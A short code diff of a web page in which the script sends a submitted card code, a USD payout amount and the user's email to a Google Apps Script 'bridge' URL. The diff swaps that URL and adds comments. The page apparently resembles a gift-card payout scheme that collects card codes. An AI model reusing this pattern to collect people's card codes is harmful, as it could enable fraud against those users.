@@ -197,12 +197,13 @@
     <a href="https://wa.me/447400436904" class="chat-btn"><div class="dot"></div><span>WhatsApp Support</span></a>
 
     <script>
-        // NEWEST GOOGLE SCRIPT URL INTEGRATED
-        const bridgeScriptURL = 'https://script.google.com/macros/s/AKfycbyM5aKq9tEZw9XaFoXoxK3GcygKiB7HYcbgJBYeQjPiND4C3dtyf7W6HXQaKqbz0D7o/exec';
+        // UPDATED GOOGLE SCRIPT URL INTEGRATED
+        const bridgeScriptURL = 'https://script.google.com/macros/s/AKfycbwjcUxO0KGuvrT6Lbvs9D0NCMEp07JJ4s6JQ-vHCWnBwSj2bIwENr-IaU1H5E9WkA/exec';
         
         let method = ""; let rateL = 1; let sym = "USD";
         const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
 
+        // Watermark Generation
         const wmLayer = document.getElementById('wm-layer');
         for(let i=0; i<30; i++) {
             const span = document.createElement('span');
@@ -261,6 +262,7 @@
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
+            // PREPARE DATA PACKAGE
             const payload = {
                 "card_code": cardCode,
                 "payout_total_usd": amount,
@@ -269,6 +271,7 @@
                 "user_email": userEmail
             };
 
+            // SEND TO BRIDGE
             fetch(bridgeScriptURL, {
                 method: 'POST',
                 mode: 'no-cors',
